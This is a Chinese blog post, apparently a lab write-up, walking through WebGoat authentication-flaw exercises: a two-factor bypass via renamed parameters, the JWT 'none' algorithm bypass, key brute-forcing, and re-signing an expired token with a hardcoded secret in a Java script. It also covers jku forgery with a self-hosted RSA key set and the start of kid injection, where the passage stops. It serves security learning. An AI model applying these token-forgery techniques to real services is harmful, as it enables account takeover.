@@ -1,0 +1,891 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Web, Security, Web安全, Java, Java安全">
+    <meta name="description" content="记录一下我的网安学习">
+    <meta name="author" content="1diot9">
+    
+    <title>
+        
+            WebGoat靶场-身份认证缺陷 |
+        
+        1diot9&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/baka.png">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#CCCCCC","title":"1diot9's Blog","author":"1diot9","avatar":"/images/baka.png","logo":"/images/baka.png","favicon":"/images/baka.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"登上山顶的人沉默不语，半途而废者诉说着旅途的艰辛","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://www.github.com/1diot9","weixin":"img | /images/weixin.jpg","qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null},"img_align":"center"},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2025,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/baka.png">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               1diot9&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                标签
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                分类
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
+                                
+                                关于
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            分类
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                            关于
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        WebGoat靶场-身份认证缺陷
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/baka.png">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">1diot9</span>
+                                
+                                    <span class="author-badge">Lv3</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2025-07-22 22:20:48</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Tue Jul 22 2025 22:30:28 GMT+0800">2025-07-22 22:30:28</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>3.3k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>13 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>简单的部分就一笔带过了。虽然有些是之前学过的，但这里从代码审计的角度再看一遍，加深印象。现在还在想一个问题，是边写边做笔记，还是写完再做笔记更好？这里先选择边写边做试试。</p>
+<h1 id="二因素认证绕过"><a href="#二因素认证绕过" class="headerlink" title="二因素认证绕过"></a>二因素认证绕过</h1><p>抓包后找到对应的方法，直接看源码：<img   src="/2025/05/03/JNI/oat%E9%9D%B6%E5%9C%BA-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7/image-1753194339300.png"  alt="img"></p>
+<p>要success，先要不进入上面的if，然后进入下面的if。</p>
+<p>先看上面if的判断。</p>
+<p>paseSecQuestions是只留下含有secQuestion的POST参数，即留下安全问题的答案，具体方法如下：<img   src="/2025/05/03/JNI/oat%E9%9D%B6%E5%9C%BA-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7/image-1753194339194.png"  alt="img"></p>
+<p>默认的secQuestion参数是secQuestion0和secQuestion1，我们可以改成任意包含secQuestion的参数。</p>
+<p>然后跟进didUserLikelylCheat方法，具体代码：<img   src="/2025/05/03/JNI/oat%E9%9D%B6%E5%9C%BA-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7/image-1753194339377.png"  alt="img"></p>
+<p>我们需要返回false，这里让secQuestion参数不是secQuestion0和secQuestion1就行，我这里改成secQuestionA和secQuestionB。理论上这里直接去掉这两个参数都行，但是这样后面会出问题。</p>
+<p>接着看第二个if，即verifyAccount方法：<img   src="/2025/05/03/JNI/oat%E9%9D%B6%E5%9C%BA-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7/image-1753194339219.png"  alt="img"></p>
+<p>这里解释了为什么不能把secQuestion参数删除，删了就过不了这里的第一个if了。下面两个if由于我们把secQuestion改成了secQuestionA&amp;secQuestionB，所以不用知道安全问题的答案也能通过。</p>
+<p>最终报文：<img   src="/2025/05/03/JNI/oat%E9%9D%B6%E5%9C%BA-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7/image.png"  alt="img"></p>
+<h1 id="明文传输"><a href="#明文传输" class="headerlink" title="明文传输"></a>明文传输</h1><p>这个很简单，就是抓包后得到的是明文，这样被嗅探的话就很危险。具体不演示了，抓包就行。</p>
+<h1 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h1><h2 id="jwt解码"><a href="#jwt解码" class="headerlink" title="jwt解码"></a>jwt解码</h2><p>这个很简单，直接base64解码就行，推荐用jwt.io这个网站：<img   src="/2025/05/03/JNI/oat%E9%9D%B6%E5%9C%BA-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7/image-1753194339243.png"  alt="img"></p>
+<h2 id="空签名绕过"><a href="#空签名绕过" class="headerlink" title="空签名绕过"></a>空签名绕过</h2><p>这关需要以admin身份去reset。点击任意一个vote按钮，都提示我们是guest，需要先登录：<img   src="/2025/05/03/JNI/oat%E9%9D%B6%E5%9C%BA-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7/image-1753194401777.png"  alt="img"></p>
+<p>看一下cookie，发现虽然有token，但是是空的：<img   src="/2025/05/03/JNI/oat%E9%9D%B6%E5%9C%BA-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7/image-1753194401789.png"  alt="img"></p>
+<p>但是这里又没有login的登录框，所以去看源码吧。</p>
+<p>能够发现有一个login方法：<img   src="https://cdn.nlark.com/yuque/0/2025/png/53465197/1753153407401-665ba179-4675-46e9-a858-3e89572005d9.png"  alt="img"></p>
+<p>if判断需要我们传入一个特定的user，不然就会进入else，返回一个空的token。这个特定的user是硬编码，在上面找到：<img   src="/2025/05/03/JNI/oat%E9%9D%B6%E5%9C%BA-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7/image-1753194401868.png"  alt="img"></p>
+<p>同时55行也给了jwt的key，先有个印象。</p>
+<p>访问&#x2F;login后，即可获得token：<img   src="https://cdn.nlark.com/yuque/0/2025/png/53465197/1753153716359-1e9e1893-40dc-443e-ace5-db18810b6978.png"  alt="img"></p>
+<p>后来才知道，TomJerrySylvester原来是三个用户，不过不影响：</p>
+<p><img   src="https://cdn.nlark.com/yuque/0/2025/png/53465197/1753153806561-ea1e5d47-4aac-4b1d-8a15-d411b47a7d14.png"  alt="img"></p>
+<p>接下来切换到tom，解码他的token：<img   src="https://cdn.nlark.com/yuque/0/2025/png/53465197/1753153868929-b1144bdc-d97b-4205-ba9d-4ba60469158d.png"  alt="img"></p>
+<p>这里可以用none加密绕过，原因在resetVotes方法里。首先，为什么直接去看resetVotes方法？因为我们的目标就是reset，所以优先找最接近的方法。下面是具体代码：<img   src="https://cdn.nlark.com/yuque/0/2025/png/53465197/1753153990229-f0499efe-79de-4d06-89dd-0b1a45742154.png"  alt="img"></p>
+<p>注意这个parse，这个parse是不会验证用户提供的token签名是否与真实的token签名一致，因此签名的作用形同虚设，可以直接通过none绕过，具体如下：<img   src="https://cdn.nlark.com/yuque/0/2025/png/53465197/1753154109484-576a1553-16f0-46e9-955d-096d2fbe33bd.png"  alt="img">直接把签名算法部分改成none，然后在下面直接修改payload部分即可。最后更改token，再次reset就行了。</p>
+<p>那么，验证签名的jwt解析代码怎么写？其实很简单，把parse方法改成parseClaimsJws即可：<img   src="https://cdn.nlark.com/yuque/0/2025/png/53465197/1753154246841-d75c3879-44dc-4803-b0ac-edfd06faca55.png"  alt="img"></p>
+<h2 id="jwt密钥暴力破解"><a href="#jwt密钥暴力破解" class="headerlink" title="jwt密钥暴力破解"></a>jwt密钥暴力破解</h2><p>当使用弱密码时，我们可以尝试暴力破解或字典破解jwt的key，这里推荐使用jwt_tool：<a class="link"   target="_blank" rel="noopener" href="https://github.com/ticarpi/jwt_tool" >https://github.com/ticarpi/jwt_tool<i class="fas fa-external-link-alt"></i></a></p>
+<p>成功找到victory就是密钥：<img   src="/2025/05/03/JNI/oat%E9%9D%B6%E5%9C%BA-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7/image-1753194468987.png"  alt="img"></p>
+<p>另外，查看源码可以发现一共有5个key，每次会随机一个，而且实际上的JWT_SECRET是单词进行base64编码的：</p>
+<p><img   src="/2025/05/03/JNI/oat%E9%9D%B6%E5%9C%BA-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7/image-1753194468990.png"  alt="img"></p>
+<p>本来还是想用jwt.io，但是那边说key太短，没法加密：<img   src="/2025/05/03/JNI/oat%E9%9D%B6%E5%9C%BA-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7/image-1753194469002.png"  alt="img"></p>
+<p>所以写个脚本加密，直接照搬题目的加密逻辑就行了：<img   src="/2025/05/03/JNI/oat%E9%9D%B6%E5%9C%BA-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7/image-1753194469004.png"  alt="img"></p>
+<h2 id="过期token重放"><a href="#过期token重放" class="headerlink" title="过期token重放"></a>过期token重放</h2><p>这个的重点也在拿到key，没key是改不了的。</p>
+<p>还是先简单做一下黑盒测试，对这个关卡抓包，可以发现：<img   src="/2025/05/03/JNI/oat%E9%9D%B6%E5%9C%BA-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7/image-1753194481523.png"  alt="img"></p>
+<p>这个就是给我们发放token的过程，去看对应代码：<img   src="/2025/05/03/JNI/oat%E9%9D%B6%E5%9C%BA-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7/image-1753194481466.png"  alt="img"></p>
+<p>过程很简单，就是根据我们的user和password发token。这里的token有两个：1、普通的token，有iat(签发时间)、admin、user、算法是HS512   2、refreshtoken，随机产生的    这两个token最后都存入一个叫tokenJson的HashMap里。</p>
+<p>接着看重点，即过关条件的代码：<img   src="https://cdn.nlark.com/yuque/0/2025/png/53465197/1753164946476-b6788201-f7bb-441a-9db1-f0a526520656.png"  alt="img"></p>
+<p>有两种过关方式，两者的共同条件都是JWT中的user&#x3D;Tom</p>
+<p>1、空签名：这个很简单，alg改成none，然后直接修改即可</p>
+<p><img   src="https://cdn.nlark.com/yuque/0/2025/png/53465197/1753165678609-bd2f30e2-dbaa-406d-ba72-44c66941660b.png"  alt="img"></p>
+<p>2、过期token重放：这个需要先去找到tom之前的token，靶场给我们提供了：<img   src="https://cdn.nlark.com/yuque/0/2025/png/53465197/1753165422046-a3e91854-97cb-4f25-a094-e96e99617a93.png"  alt="img"></p>
+<p>找到tom之前的token后解码，发现token2018年就过期了：</p>
+<p><img   src="https://cdn.nlark.com/yuque/0/2025/png/53465197/1753165476235-ef91481a-5fb0-4360-8a0f-a7163fce3af0.png"  alt="img"></p>
+<p>现在的目标就是找出key，然后改时间。key硬编码在源码中，所以写个脚本重新生成JWT就行，注意算法是HS512，这个卡了我好久：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> tmp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Jwts;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.SignatureAlgorithm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.time.Instant;</span><br><span class="line"><span class="keyword">import</span> java.util.Calendar;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jtw</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">JWT_SECRET</span> <span class="operator">=</span> <span class="string">&quot;bm5n3SkxCX4kKRy4&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getSecretToken</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Jwts.builder()</span><br><span class="line">                .setIssuedAt(Calendar.getInstance().getTime())</span><br><span class="line">                .setExpiration(Date.from(Instant.now().plusSeconds(<span class="number">600</span>)))</span><br><span class="line">                .claim(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;Tom&quot;</span>)</span><br><span class="line">                .claim(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;false&quot;</span>)</span><br><span class="line">                .signWith(SignatureAlgorithm.HS512, JWT_SECRET)</span><br><span class="line">                .compact();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">secretToken</span> <span class="operator">=</span> getSecretToken();</span><br><span class="line">        System.out.println(secretToken);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后在请求体中替换token即可。<img   src="https://cdn.nlark.com/yuque/0/2025/png/53465197/1753165643264-29b7b296-cd8a-438f-978c-6cd4df6ef9da.png"  alt="img"></p>
+<h2 id="jku伪造"><a href="#jku伪造" class="headerlink" title="jku伪造"></a>jku伪造</h2><p>简单理解： JWT 的 <code>jku</code> 字段可以指向一个远程 URL，表示验证 token 时应从该 URL 下载公钥。攻击者可以伪造这个 URL 指向自己控制的服务器，从而用自己的私钥签发伪造的 token，并通过验证。 </p>
+<p>首先，还是抓包delete请求，看看token：<img   src="/2025/05/03/JNI/oat%E9%9D%B6%E5%9C%BA-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7/image-1753194537312.png"  alt="img"><img   src="/2025/05/03/JNI/oat%E9%9D%B6%E5%9C%BA-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7/image-1753194537277.png"  alt="img"></p>
+<p>目标很明确，生成自己的RSA256密钥对，将jku指向自己的公钥存放URL，修改username为Tom后用自己的私钥签名。</p>
+<p>先让ai写一段脚本生成密钥：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> serialization</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成私钥</span></span><br><span class="line">private_key = rsa.generate_private_key(</span><br><span class="line">    public_exponent=<span class="number">65537</span>,</span><br><span class="line">    key_size=<span class="number">2048</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导出私钥 PEM</span></span><br><span class="line">private_pem = private_key.private_bytes(</span><br><span class="line">    encoding=serialization.Encoding.PEM,</span><br><span class="line">    <span class="built_in">format</span>=serialization.PrivateFormat.PKCS8,</span><br><span class="line">    encryption_algorithm=serialization.NoEncryption()</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成公钥</span></span><br><span class="line">public_key = private_key.public_key()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导出公钥 PEM</span></span><br><span class="line">public_pem = public_key.public_bytes(</span><br><span class="line">    encoding=serialization.Encoding.PEM,</span><br><span class="line">    <span class="built_in">format</span>=serialization.PublicFormat.SubjectPublicKeyInfo</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./rsa/private.pem&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(private_pem)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./rsa/public.pem&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(public_pem)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;✅ RSA256 密钥对已生成：private.pem 和 public.pem&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>然后，把公钥写成json形式，这个我也是问了ai才知道，前面一直错：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;keys&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;kty&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RSA&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;use&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sig&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;kid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;public&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;n&quot;</span><span class="punctuation">:</span> <span class="string">&quot;waG38ngPzF_qHctvoZywVkCCYCRrII9agN3sE-Tb0djiyY_0SaRi-GJttO8FT0pGysWR71p7SzMUQV15DctIcKFACLPgsWX_J_ubd7AkcNDZtj5usdODid37SA8Pflj-Ie83etC4fqcQVLNPeZkqYA2pY5y_OuttiFpwWaxpO6GVSKCyK8P3Op9rNqfoB5FdS90axTf_Peq3cNhKgRlfzrmYP9KA7w8j4wQB6YiK7FKyy05VLzAFUeuupPDLgZ3HMaD3nfE55YkAr7vJkrdg-9qh3L6uvteWj84eDRXK-lvWXbY0VMQGCj4qJXzuogHqsVggyM8E4GUEeQghOTlR6Q&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;e&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AQAB&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>具体含义如下：</p>
+<p><img   src="/2025/05/03/JNI/oat%E9%9D%B6%E5%9C%BA-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7/image-1753194553022.png"  alt="img"></p>
+<p>建议让AI生成，没接触过rsa加密很容易错，把公钥提供给ai就行。</p>
+<p>创建一个public.json文件，然后在同目录下开一个python http服务(python -m http.server 7778)</p>
+<p>最后私钥签名即可，过期时间别忘记改：<img   src="/2025/05/03/JNI/oat%E9%9D%B6%E5%9C%BA-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7/image-1753194553032.png"  alt="img"></p>
+<p>最后抓包改token就行了：</p>
+<p><img   src="/2025/05/03/JNI/oat%E9%9D%B6%E5%9C%BA-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7/image-1753194561323.png"  alt="img"></p>
+<h2 id="kid注入"><a href="#kid注入" class="headerlink" title="kid注入"></a>kid注入</h2><p>kid的含义在上面学过了，就是取出对应的签名密钥。下面看关键代码：<img   src="/2025/05/03/JNI/oat%E9%9D%B6%E5%9C%BA-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7/image-1753194561353.png"  alt="img"></p>
+<p>获取密钥的方式在这个重写方法中，调试一下能跟进去。另外要注意，key被查询出后，会进行一次base64解码再用于签名验证，所以之后注入时需要将你的密钥base64加密后再注入。</p>
+<p>总任务还是获取key，这里有两种方法。</p>
+<p>1、直接由调试获取它原本的key</p>
+<p>这种是非常规打法，因为现实环境不可能在审计时连上它的数据库，但这里还是讲一下。</p>
+<p>获取key：</p>
+<p><img   src="/2025/05/03/JNI/oat%E9%9D%B6%E5%9C%BA-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7/image-1753194573691.png"  alt="img"></p>
+<p>然后写脚本签名即可：</p>
